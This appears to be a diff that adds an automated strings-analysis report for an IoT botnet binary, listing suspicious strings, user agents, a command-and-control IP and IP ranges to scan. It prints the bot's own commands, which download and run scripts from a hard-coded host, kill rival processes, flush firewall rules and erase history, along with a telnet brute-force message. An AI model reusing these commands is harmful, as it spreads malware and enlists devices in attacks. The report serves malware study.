@@ -1,0 +1,1596 @@
+=============================================================================
+========	BINARY ID :ecc17b1916445b94fbb749b6f52e018322696bc6==================================================
+================================================================================
+================================================================================
+========	STRINGS SUMMARY : =====================================================
+================================================================================
+TOTAL STRINGS COUNT :3374
+SUPSCPECTED LINES COUNT :219
+SUPSCPECTED STRINGS COUNT (DISTINCT) :27
+SUPSCPECTED STRINGS WEIGHT :104
+SUSPECT STRING SCORE : [104 / 150] 69%
+USER AGENTS STRINGS COUNT :62
+STATIC IPs STRINGS COUNT :2
+DYNAMIC IPs STRINGS COUNT :1265
+================================================================================
+========	STRINGS DETAILS : =====================================================
+================================================================================
+================================================================================
+========	SUSPECTED STRINGS : =====================================================
+================================================================================
+telnet
+cd /tmp; wget http://159.89.35.204/bins.sh || curl -O http://159.89.35.204/bins.sh; chmod 777 bins.sh; sh bins.sh; busybox tftp 159.89.35.204 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r tftp2.sh -g 159.89.35.204; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf bins.sh tftp1.sh tftp2.sh; rm -rf *;history -c\r\n
+/proc/cpuinfo
+PING
+gethostbyname
+\e[0;31mSuccessfully Bruteforced IP: \e[0;33m%s | \e[0;31mUsername: \e[0;33m%s | \e[0;31mPassword: \e[0;33m%s\e[0m
+bot*
+/dev/netslink/
+/usr/
+bin*
+>%s.t && cd %s && for a in `ls -a %s`; do >$a; done; >retrieve ;echo ps aux >> proc ; pkill -9 %d\r\n
+pkill -9 %s\r\n
+rm -rf /bin/netstat
+pkill -9 busybox
+pkill -9 perl
+/sbin/iptables -F;/sbin/iptables -X
+Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10
+Mozilla/6.0 (Future Star Technologies Corp. Star-Blade OS; U; en-US) iNet Browser 2.5
+Mozilla/5.0(iPad; U; CPU iPhone OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B314 Safari/531.21.10gin_lib.cc
+Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41
+Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0
+Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)
+Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285
+BlackBerry9700/5.0.0.743 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/100findlinks/2.0.1 (+http://wortschatz.uni-leipzig.de/findlinks/)
+findlinks/1.1.6-beta6 (+http://wortschatz.uni-leipzig.de/findlinks/)
+findlinks/1.1.6-beta4 (+http://wortschatz.uni-leipzig.de/findlinks/)
+findlinks/1.1.6-beta1 (+http://wortschatz.uni-leipzig.de/findlinks/)
+findlinks/1.1.5-beta7 (+http://wortschatz.uni-leipzig.de/findlinks/)
+Mozilla/5.0 (X11; U; Linux i686; nl; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2 (Debian-1.99+2.0b2+dfsg-1)
+AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)
+AppEngine-Google; (+http://code.google.com/appengine; appid: unblock4myspace)AppEngine-Google; (+http://code.google.com/appengine; appid: tunisproxy)
+AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-in-rs)
+AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-ba-k)
+AppEngine-Google; (+http://code.google.com/appengine; appid: moelonepyaeshan)
+AppEngine-Google; (+http://code.google.com/appengine; appid: mirrorrr)
+AppEngine-Google; (+http://code.google.com/appengine; appid: mapremiereapplication)
+AppEngine-Google; (+http://code.google.com/appengine; appid: longbows-hideout)
+AppEngine-Google; (+http://code.google.com/appengine; appid: eduas23)
+AppEngine-Google; (+http://code.google.com/appengine; appid: craigserver)
+AppEngine-Google; ( http://code.google.com/appengine; appid: proxy-ba-k)
+magpie-crawler/1.1 (U; Linux amd64; en-GB; +http://www.brandwatch.net)
+Mozilla/5.0 (compatible; MJ12bot/v1.2.4; http://www.majestic12.co.uk/bot.php?+)
+Mozilla/5.0 (compatible; MJ12bot/v1.2.3; http://www.majestic12.co.uk/bot.php?+)
+MJ12bot/v1.0.8 (http://majestic12.co.uk/bot.php?+)
+MJ12bot/v1.0.7 (http://majestic12.co.uk/bot.php?+)
+Mozilla/5.0 (compatible; MojeekBot/2.0; http://www.mojeek.com/bot.html)
+%s %s HTTP/1.1\r\nConnection: %s\r\nAccept: */*\r\nUser-Agent: %s\r\n
+http
+Failed opening raw socket.
+Invalid flag "%s"
+GETLOCALIP
+pkill -9 python
+yum install python-paramiko -y;apt-get install python-paramiko -y;mkdir /.tmp;cd /.tmp;wget http://159.89.35.204/purge.py
+Conncted To Python Scanner
+BOTKILL
+Killing Bots
+LOOPING PAYLOAD
+SCANNER
+SCANNER ON | OFF
+HTTP
+/proc/net/route
+/usr/bin/python
+/usr/sbin/dropbear
+\e[0;32mConnected | IP: %s | Type: %s | Version: %s
+ !"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`ABCDEFGHIJKLMNOPQRSTUVWXYZ{|}~
+No such process
+Interrupted system call
+No child processes
+Too many open files in system
+Read-only file system
+Level 2 not synchronized
+Machine is not on the network
+Name not unique on network
+Interrupted system call should be restarted
+Socket operation on non-socket
+Protocol wrong type for socket
+Socket type not supported
+Network is down
+Network is unreachable
+Network dropped connection on reset
+Software caused connection abort
+Connection reset by peer
+Transport endpoint is already connected
+Transport endpoint is not connected
+Connection timed out
+Connection refused
+Host is down
+No route to host
+Operation already in progress
+Operation now in progress
+Unknown host
+Host name lookup failure
+/proc/stat
+/proc/cpuinfo
+processor
+/sys/devices/system/cpu
+/bin/sh
+ !"#$%&'()*+,-./0123456789:;<=>?@abcdefghijklmnopqrstuvwxyz[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~
+/etc/hosts
+fdopen_pids
+fork.c
+getpid.c
+kill.c
+sigprocmask.c
+waitpid.c
+spec_flags.5145
+strstr.c
+_string_syserrmsgs.c
+error_msg
+inet_ntoa.c
+inet_makeaddr.c
+gethostbyname.c
+gethostbyname2.c
+hoste.5842
+connect.c
+socket.c
+__malloc_largebin_index
+rand.c
+random.c
+randtbl
+random_r.c
+random_poly_info
+nprocessors_onln
+system.c
+inet_aton.c
+gethostbyname2_r.c
+inet_pton4
+inet_ntop4
+dnslookup.c
+get_hosts_byname_r.c
+gethostbyname_r.c
+gethostname.c
+read_etc_hosts_r.c
+__read_etc_hosts_r
+waitpid
+__res_sync
+random
+connect
+numpids
+initConnection
+inet_pton
+sendTCP
+__GI_random_r
+getpid
+getHost
+makeRandomStr
+sendHTTP
+system
+__open_etc_hosts
+__dns_lookup
+random_r
+gethostbyname_r
+tcpcsum
+socket
+_string_syserrmsgs
+__GI_inet_ntoa
+srandom_r
+__GI_inet_ntoa_r
+hostname_to_ip
+__GI_srandom_r
+Server_Botport
+kill
+__GI_sigprocmask
+inet_addr
+__GI_gethostname
+connectTimeout
+__GI_kill
+__local_nameserver
+gethostbyname2_r
+ngPid
+strstr
+init_rand
+rand
+HackerScan2
+__GI_gethostbyname_r
+__GI_inet_ntop
+fork
+__GI_gethostbyname
+__GI_random
+__GI_fork
+__GI_getpid
+inet_aton
+processCmd
+get_telstate_host
+__GI_socket
+listFork
+srand
+sendUDP
+inet_ntoa
+__libc_system
+__get_hosts_byname_r
+botkiller
+HackerScan
+__GI_inet_pton
+gethostbyname
+__vfork
+gethostname
+__libc_waitpid
+socket_connect
+__GI_waitpid
+vfork
+srandom
+__libc_fork
+scanPid
+rand_cmwc
+inet_ntoa_r
+__GI_gethostbyname2
+__GI_strstr
+__GI_connect
+inet_ntop
+gethostbyname2
+__GI_inet_aton
+hekkertelnet
+__GI_vfork
+__GI_gethostbyname2_r
+__GI_inet_addr
+__libc_connect
+pids
+sigprocmask
+================================================================================
+========	USER AGENTS STRINGS : =====================================================
+================================================================================
+Mozilla/5.0 (compatible; Konqueror/3.0; i686 Linux; 20021117)
+Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5
+Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10
+Mozilla/5.0 Galeon/1.0.3 (X11; Linux i686; U;) Gecko/0
+Opera/6.04 (Windows XP; U) [en]
+Opera/9.99 (X11; U; sk)
+Mozilla/6.0 (Future Star Technologies Corp. Star-Blade OS; U; en-US) iNet Browser 2.5
+Mozilla/5.0(iPad; U; CPU iPhone OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B314 Safari/531.21.10gin_lib.cc
+Mozilla/5.0 Galeon/1.2.9 (X11; Linux i686; U;) Gecko/20021213 Debian/1.2.9-0.bunk
+Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41
+Mozilla/5.0 (compatible; iCab 3.0.3; Macintosh; U; PPC Mac OS)
+Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0
+Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.9a8) Gecko/2007100620 GranParadiso/3.1
+Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)
+Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.11) Gecko/20071128 Camino/1.5.4
+Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201
+Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.6) Gecko/2009020911
+Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2
+Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)
+Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285
+Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7
+Mozilla/5.0 (PLAYSTATION 3; 3.55)
+Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Thunderbird/38.2.0 Lightning/4.0.2
+wii libnup/1.0
+Mozilla/4.0 (PSP (PlayStation Portable); 2.00)
+PSP (PlayStation Portable); 2.00
+Bunjalloo/0.7.6(Nintendo DS;U;en)
+Doris/1.15 [en] (Symbian)
+BlackBerry7520/4.0.0 Profile/MIDP-2.0 Configuration/CLDC-1.1
+BlackBerry9700/5.0.0.743 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/100findlinks/2.0.1 (+http://wortschatz.uni-leipzig.de/findlinks/)
+findlinks/1.1.6-beta6 (+http://wortschatz.uni-leipzig.de/findlinks/)
+findlinks/1.1.6-beta4 (+http://wortschatz.uni-leipzig.de/findlinks/)
+findlinks/1.1.6-beta1 (+http://wortschatz.uni-leipzig.de/findlinks/)
+findlinks/1.1.5-beta7 (+http://wortschatz.uni-leipzig.de/findlinks/)
+Mozilla/5.0 (Windows; U; WinNT; en; rv:1.0.2) Gecko/20030311 Beonex/0.8.2-stable
+Mozilla/5.0 (Windows; U; WinNT; en; Preview) Gecko/20020603 Beonex/0.8-stable
+Mozilla/5.0 (X11; U; Linux i686; nl; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2 (Debian-1.99+2.0b2+dfsg-1)
+Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2
+Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1b2) Gecko/20060826 BonEcho/2.0b2
+Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.8.1b2) Gecko/20060831 BonEcho/2.0b2
+Mozilla/5.0 (X11; U; Linux x86_64; en-GB; rv:1.8.1b1) Gecko/20060601 BonEcho/2.0b1 (Ubuntu-edgy)
+Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a3) Gecko/20060526 BonEcho/2.0a3
+Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2
+Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2
+Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2
+AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)
+AppEngine-Google; (+http://code.google.com/appengine; appid: unblock4myspace)AppEngine-Google; (+http://code.google.com/appengine; appid: tunisproxy)
+AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-in-rs)
+AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-ba-k)
+AppEngine-Google; (+http://code.google.com/appengine; appid: moelonepyaeshan)
+AppEngine-Google; (+http://code.google.com/appengine; appid: mirrorrr)
+AppEngine-Google; (+http://code.google.com/appengine; appid: mapremiereapplication)
+AppEngine-Google; (+http://code.google.com/appengine; appid: longbows-hideout)
+AppEngine-Google; (+http://code.google.com/appengine; appid: eduas23)
+AppEngine-Google; (+http://code.google.com/appengine; appid: craigserver)
+AppEngine-Google; ( http://code.google.com/appengine; appid: proxy-ba-k)
+Mozilla/5.0 (compatible; MJ12bot/v1.2.4; http://www.majestic12.co.uk/bot.php?+)
+Mozilla/5.0 (compatible; MJ12bot/v1.2.3; http://www.majestic12.co.uk/bot.php?+)
+MJ12bot/v1.0.8 (http://majestic12.co.uk/bot.php?+)
+MJ12bot/v1.0.7 (http://majestic12.co.uk/bot.php?+)
+Mozilla/5.0 (compatible; MojeekBot/2.0; http://www.mojeek.com/bot.html)
+%s %s HTTP/1.1\r\nConnection: %s\r\nAccept: */*\r\nUser-Agent: %s\r\n
+================================================================================
+========	STATIC IP ADRESSES : =====================================================
+================================================================================
+159.89.35.204:775
+8.8.8.8
+================================================================================
+========	DYNAMIC IP MASKS : =====================================================
+================================================================================
+1.188.%d.%d
+1.56.%d.%d
+101.108.%d.%d
+101.109.%d.%d
+101.248.%d.%d
+101.51.%d.%d
+103.14.%d.%d
+103.195.%d.%d
+103.198.%d.%d
+103.20.%d.%d
+103.203.%d.%d
+103.204.%d.%d
+103.214.%d.%d
+103.218.%d.%d
+103.220.%d.%d
+103.225.%d.%d
+103.228.%d.%d
+103.231.%d.%d
+103.242.%d.%d
+103.248.%d.%d
+103.253.%d.%d
+103.255.%d.%d
+103.30.%d.%d
+103.35.%d.%d
+103.44.%d.%d
+103.47.%d.%d
+103.49.%d.%d
+103.54.%d.%d
+103.55.%d.%d
+103.57.%d.%d
+103.60.%d.%d
+103.62.%d.%d
+104.55.%d.%d
+106.108.%d.%d
+106.110.%d.%d
+106.112.%d.%d
+106.113.%d.%d
+106.114.%d.%d
+106.115.%d.%d
+106.116.%d.%d
+106.117.%d.%d
+106.118.%d.%d
+106.119.%d.%d
+106.122.%d.%d
+106.123.%d.%d
+106.124.%d.%d
+106.125.%d.%d
+106.126.%d.%d
+106.127.%d.%d
+106.16.%d.%d
+106.18.%d.%d
+106.224.%d.%d
+106.228.%d.%d
+106.229.%d.%d
+106.230.%d.%d
+106.32.%d.%d
+106.33.%d.%d
+106.34.%d.%d
+106.35.%d.%d
+106.36.%d.%d
+106.4.%d.%d
+106.40.%d.%d
+106.41.%d.%d
+106.42.%d.%d
+106.43.%d.%d
+106.44.%d.%d
+106.45.%d.%d
+106.46.%d.%d
+106.56.%d.%d
+106.58.%d.%d
+106.6.%d.%d
+106.60.%d.%d
+106.62.%d.%d
+106.7.%d.%d
+106.8.%d.%d
+106.80.%d.%d
+106.82.%d.%d
+106.84.%d.%d
+106.86.%d.%d
+106.88.%d.%d
+106.9.%d.%d
+106.90.%d.%d
+106.92.%d.%d
+109.184.%d.%d
+110.136.%d.%d
+110.137.%d.%d
+110.138.%d.%d
+110.139.%d.%d
+110.152.%d.%d
+110.156.%d.%d
+110.166.%d.%d
+110.176.%d.%d
+110.184.%d.%d
+110.224.%d.%d
+110.225.%d.%d
+110.227.%d.%d
+110.235.%d.%d
+110.80.%d.%d
+110.88.%d.%d
+111.112.%d.%d
+111.120.%d.%d
+111.124.%d.%d
+111.126.%d.%d
+111.170.%d.%d
+111.172.%d.%d
+111.176.%d.%d
+111.224.%d.%d
+111.72.%d.%d
+111.9.%d.%d
+112.100.%d.%d
+112.112.%d.%d
+112.116.%d.%d
+112.196.%d.%d
+112.200.%d.%d
+112.201.%d.%d
+112.202.%d.%d
+112.203.%d.%d
+112.204.%d.%d
+112.205.%d.%d
+112.206.%d.%d
+112.207.%d.%d
+112.208.%d.%d
+112.209.%d.%d
+112.210.%d.%d
+112.211.%d.%d
+112.212.%d.%d
+112.213.%d.%d
+112.26.%d.%d
+112.27.%d.%d
+112.28.%d.%d
+112.29.%d.%d
+112.30.%d.%d
+112.31.%d.%d
+112.45.%d.%d
+112.5.%d.%d
+112.66.%d.%d
+112.98.%d.%d
+113.112.%d.%d
+113.12.%d.%d
+113.120.%d.%d
+113.128.%d.%d
+113.132.%d.%d
+113.136.%d.%d
+113.16.%d.%d
+113.160.%d.%d
+113.161.%d.%d
+113.162.%d.%d
+113.163.%d.%d
+113.164.%d.%d
+113.165.%d.%d
+113.166.%d.%d
+113.167.%d.%d
+113.168.%d.%d
+113.169.%d.%d
+113.174.%d.%d
+113.175.%d.%d
+113.176.%d.%d
+113.177.%d.%d
+113.178.%d.%d
+113.183.%d.%d
+113.188.%d.%d
+113.189.%d.%d
+113.190.%d.%d
+113.191.%d.%d
+113.218.%d.%d
+113.220.%d.%d
+113.24.%d.%d
+113.240.%d.%d
+113.248.%d.%d
+113.53.%d.%d
+113.62.%d.%d
+113.64.%d.%d
+113.96.%d.%d
+114.104.%d.%d
+114.135.%d.%d
+114.138.%d.%d
+114.216.%d.%d
+114.224.%d.%d
+114.67.%d.%d
+114.96.%d.%d
+115.148.%d.%d
+115.152.%d.%d
+115.168.%d.%d
+115.169.%d.%d
+115.170.%d.%d
+115.192.%d.%d
+115.224.%d.%d
+116.1.%d.%d
+116.16.%d.%d
+116.204.%d.%d
+116.207.%d.%d
+116.208.%d.%d
+116.248.%d.%d
+116.252.%d.%d
+116.4.%d.%d
+116.52.%d.%d
+116.68.%d.%d
+116.69.%d.%d
+116.71.%d.%d
+116.8.%d.%d
+116.93.%d.%d
+117.162.%d.%d
+117.165.%d.%d
+117.170.%d.%d
+117.171.%d.%d
+117.173.%d.%d
+117.175.%d.%d
+117.176.%d.%d
+117.177.%d.%d
+117.178.%d.%d
+117.181.%d.%d
+117.192.%d.%d
+117.193.%d.%d
+117.194.%d.%d
+117.195.%d.%d
+117.196.%d.%d
+117.197.%d.%d
+117.198.%d.%d
+117.199.%d.%d
+117.200.%d.%d
+117.201.%d.%d
+117.202.%d.%d
+117.203.%d.%d
+117.204.%d.%d
+117.205.%d.%d
+117.206.%d.%d
+117.207.%d.%d
+117.21.%d.%d
+117.210.%d.%d
+117.212.%d.%d
+117.213.%d.%d
+117.214.%d.%d
+117.215.%d.%d
+117.216.%d.%d
+117.217.%d.%d
+117.218.%d.%d
+117.219.%d.%d
+117.22.%d.%d
+117.220.%d.%d
+117.221.%d.%d
+117.222.%d.%d
+117.223.%d.%d
+117.224.%d.%d
+117.225.%d.%d
+117.226.%d.%d
+117.24.%d.%d
+117.32.%d.%d
+117.40.%d.%d
+117.44.%d.%d
+117.57.%d.%d
+117.60.%d.%d
+117.64.%d.%d
+117.80.%d.%d
+117.99.%d.%d
+118.112.%d.%d
+118.120.%d.%d
+118.124.%d.%d
+118.175.%d.%d
+118.180.%d.%d
+118.186.%d.%d
+118.192.%d.%d
+118.213.%d.%d
+118.215.%d.%d
+118.239.%d.%d
+118.248.%d.%d
+118.30.%d.%d
+118.84.%d.%d
+118.96.%d.%d
+118.97.%d.%d
+118.98.%d.%d
+119.0.%d.%d
+119.111.%d.%d
+119.120.%d.%d
+119.128.%d.%d
+119.144.%d.%d
+119.150.%d.%d
+119.151.%d.%d
+119.152.%d.%d
+119.153.%d.%d
+119.154.%d.%d
+119.155.%d.%d
+119.156.%d.%d
+119.157.%d.%d
+119.158.%d.%d
+119.159.%d.%d
+119.19.%d.%d
+119.20.%d.%d
+119.41.%d.%d
+119.60.%d.%d
+119.8.%d.%d
+119.84.%d.%d
+119.92.%d.%d
+119.93.%d.%d
+119.94.%d.%d
+119.96.%d.%d
+120.32.%d.%d
+120.40.%d.%d
+120.56.%d.%d
+120.57.%d.%d
+120.59.%d.%d
+120.60.%d.%d
+120.61.%d.%d
+120.62.%d.%d
+120.63.%d.%d
+120.68.%d.%d
+121.201.%d.%d
+121.204.%d.%d
+121.224.%d.%d
+121.32.%d.%d
+121.36.%d.%d
+121.37.%d.%d
+121.56.%d.%d
+121.58.%d.%d
+121.59.%d.%d
+121.60.%d.%d
+121.8.%d.%d
+122.10.%d.%d
+122.160.%d.%d
+122.161.%d.%d
+122.162.%d.%d
+122.163.%d.%d
+122.164.%d.%d
+122.165.%d.%d
+122.166.%d.%d
+122.167.%d.%d
+122.168.%d.%d
+122.169.%d.%d
+122.170.%d.%d
+122.171.%d.%d
+122.172.%d.%d
+122.173.%d.%d
+122.174.%d.%d
+122.175.%d.%d
+122.176.%d.%d
+122.177.%d.%d
+122.178.%d.%d
+122.179.%d.%d
+122.180.%d.%d
+122.183.%d.%d
+122.198.%d.%d
+122.2.%d.%d
+122.224.%d.%d
+122.240.%d.%d
+122.3.%d.%d
+122.4.%d.%d
+122.48.%d.%d
+122.49.%d.%d
+122.52.%d.%d
+122.53.%d.%d
+122.54.%d.%d
+122.55.%d.%d
+122.9.%d.%d
+123.101.%d.%d
+123.137.%d.%d
+123.149.%d.%d
+123.16.%d.%d
+123.160.%d.%d
+123.164.%d.%d
+123.168.%d.%d
+123.17.%d.%d
+123.172.%d.%d
+123.174.%d.%d
+123.177.%d.%d
+123.178.%d.%d
+123.18.%d.%d
+123.180.%d.%d
+123.19.%d.%d
+123.20.%d.%d
+123.21.%d.%d
+123.22.%d.%d
+123.24.%d.%d
+123.25.%d.%d
+123.96.%d.%d
+124.104.%d.%d
+124.105.%d.%d
+124.106.%d.%d
+124.107.%d.%d
+124.112.%d.%d
+124.114.%d.%d
+124.115.%d.%d
+124.116.%d.%d
+124.117.%d.%d
+124.118.%d.%d
+124.21.%d.%d
+124.224.%d.%d
+124.225.%d.%d
+124.226.%d.%d
+124.228.%d.%d
+124.232.%d.%d
+124.234.%d.%d
+124.236.%d.%d
+124.253.%d.%d
+124.29.%d.%d
+124.31.%d.%d
+124.72.%d.%d
+124.73.%d.%d
+124.74.%d.%d
+124.76.%d.%d
+124.83.%d.%d
+125.104.%d.%d
+125.112.%d.%d
+125.160.%d.%d
+125.161.%d.%d
+125.162.%d.%d
+125.163.%d.%d
+125.164.%d.%d
+125.165.%d.%d
+125.167.%d.%d
+125.171.%d.%d
+125.213.%d.%d
+125.22.%d.%d
+125.24.%d.%d
+125.25.%d.%d
+125.26.%d.%d
+125.56.%d.%d
+125.64.%d.%d
+125.72.%d.%d
+125.73.%d.%d
+125.74.%d.%d
+125.76.%d.%d
+125.77.%d.%d
+125.78.%d.%d
+125.80.%d.%d
+125.88.%d.%d
+125.96.%d.%d
+137.59.%d.%d
+139.189.%d.%d
+139.200.%d.%d
+139.201.%d.%d
+139.202.%d.%d
+139.203.%d.%d
+139.204.%d.%d
+139.206.%d.%d
+139.207.%d.%d
+14.104.%d.%d
+14.112.%d.%d
+14.134.%d.%d
+14.144.%d.%d
+14.16.%d.%d
+14.160.%d.%d
+14.161.%d.%d
+14.162.%d.%d
+14.163.%d.%d
+14.164.%d.%d
+14.165.%d.%d
+14.166.%d.%d
+14.167.%d.%d
+14.168.%d.%d
+14.169.%d.%d
+14.170.%d.%d
+14.171.%d.%d
+14.172.%d.%d
+14.173.%d.%d
+14.174.%d.%d
+14.175.%d.%d
+14.176.%d.%d
+14.177.%d.%d
+14.178.%d.%d
+14.179.%d.%d
+14.180.%d.%d
+14.181.%d.%d
+14.182.%d.%d
+14.183.%d.%d
+14.184.%d.%d
+14.185.%d.%d
+14.186.%d.%d
+14.187.%d.%d
+14.188.%d.%d
+14.189.%d.%d
+14.190.%d.%d
+14.191.%d.%d
+14.204.%d.%d
+14.208.%d.%d
+14.33.%d.%d
+140.224.%d.%d
+140.237.%d.%d
+140.240.%d.%d
+140.243.%d.%d
+140.246.%d.%d
+140.249.%d.%d
+140.250.%d.%d
+140.255.%d.%d
+140.75.%d.%d
+144.0.%d.%d
+144.12.%d.%d
+144.123.%d.%d
+144.255.%d.%d
+144.48.%d.%d
+144.52.%d.%d
+146.88.%d.%d
+148.219.%d.%d
+148.221.%d.%d
+148.223.%d.%d
+148.233.%d.%d
+148.249.%d.%d
+152.240.%d.%d
+152.241.%d.%d
+152.242.%d.%d
+152.243.%d.%d
+152.244.%d.%d
+152.245.%d.%d
+152.246.%d.%d
+152.247.%d.%d
+152.248.%d.%d
+152.249.%d.%d
+152.250.%d.%d
+152.251.%d.%d
+152.252.%d.%d
+152.253.%d.%d
+152.254.%d.%d
+152.255.%d.%d
+163.47.%d.%d
+163.53.%d.%d
+171.48.%d.%d
+171.79.%d.%d
+175.201.%d.%d
+176.208.%d.%d
+176.209.%d.%d
+176.210.%d.%d
+176.211.%d.%d
+176.48.%d.%d
+176.49.%d.%d
+176.50.%d.%d
+176.51.%d.%d
+177.0.%d.%d
+177.1.%d.%d
+177.112.%d.%d
+177.113.%d.%d
+177.114.%d.%d
+177.115.%d.%d
+177.116.%d.%d
+177.117.%d.%d
+177.118.%d.%d
+177.119.%d.%d
+177.121.%d.%d
+177.138.%d.%d
+177.139.%d.%d
+177.144.%d.%d
+177.145.%d.%d
+177.146.%d.%d
+177.147.%d.%d
+177.160.%d.%d
+177.161.%d.%d
+177.162.%d.%d
+177.163.%d.%d
+177.168.%d.%d
+177.169.%d.%d
+177.170.%d.%d
+177.171.%d.%d
+177.172.%d.%d
+177.173.%d.%d
+177.174.%d.%d
+177.175.%d.%d
+177.196.%d.%d
+177.197.%d.%d
+177.199.%d.%d
+177.2.%d.%d
+177.201.%d.%d
+177.202.%d.%d
+177.203.%d.%d
+177.212.%d.%d
+177.214.%d.%d
+177.215.%d.%d
+177.24.%d.%d
+177.25.%d.%d
+177.26.%d.%d
+177.27.%d.%d
+177.3.%d.%d
+177.4.%d.%d
+177.44.%d.%d
+177.45.%d.%d
+177.48.%d.%d
+177.5.%d.%d
+177.56.%d.%d
+177.57.%d.%d
+177.6.%d.%d
+177.60.%d.%d
+177.61.%d.%d
+177.62.%d.%d
+177.63.%d.%d
+177.7.%d.%d
+177.76.%d.%d
+177.77.%d.%d
+177.78.%d.%d
+177.79.%d.%d
+177.9.%d.%d
+178.184.%d.%d
+178.185.%d.%d
+178.186.%d.%d
+178.187.%d.%d
+178.93.%d.%d
+179.100.%d.%d
+179.101.%d.%d
+179.102.%d.%d
+179.103.%d.%d
+179.110.%d.%d
+179.111.%d.%d
+179.112.%d.%d
+179.113.%d.%d
+179.114.%d.%d
+179.115.%d.%d
+179.116.%d.%d
+179.117.%d.%d
+179.118.%d.%d
+179.119.%d.%d
+179.128.%d.%d
+179.129.%d.%d
+179.130.%d.%d
+179.131.%d.%d
+179.132.%d.%d
+179.133.%d.%d
+179.134.%d.%d
+179.135.%d.%d
+179.144.%d.%d
+179.145.%d.%d
+179.147.%d.%d
+179.148.%d.%d
+179.149.%d.%d
+179.150.%d.%d
+179.151.%d.%d
+179.161.%d.%d
+179.162.%d.%d
+179.163.%d.%d
+179.164.%d.%d
+179.165.%d.%d
+179.166.%d.%d
+179.168.%d.%d
+179.172.%d.%d
+179.173.%d.%d
+179.174.%d.%d
+179.175.%d.%d
+179.224.%d.%d
+179.225.%d.%d
+179.226.%d.%d
+179.227.%d.%d
+179.229.%d.%d
+179.230.%d.%d
+179.244.%d.%d
+179.245.%d.%d
+179.246.%d.%d
+179.247.%d.%d
+179.252.%d.%d
+179.253.%d.%d
+179.254.%d.%d
+179.255.%d.%d
+179.34.%d.%d
+179.36.%d.%d
+179.37.%d.%d
+179.38.%d.%d
+179.39.%d.%d
+179.40.%d.%d
+179.55.%d.%d
+179.80.%d.%d
+179.81.%d.%d
+179.82.%d.%d
+179.83.%d.%d
+179.84.%d.%d
+179.85.%d.%d
+179.86.%d.%d
+179.87.%d.%d
+179.88.%d.%d
+179.89.%d.%d
+179.90.%d.%d
+179.91.%d.%d
+179.92.%d.%d
+179.93.%d.%d
+179.94.%d.%d
+179.98.%d.%d
+179.99.%d.%d
+180.241.%d.%d
+180.242.%d.%d
+180.243.%d.%d
+180.244.%d.%d
+180.245.%d.%d
+180.246.%d.%d
+180.247.%d.%d
+180.248.%d.%d
+180.249.%d.%d
+180.250.%d.%d
+180.251.%d.%d
+180.252.%d.%d
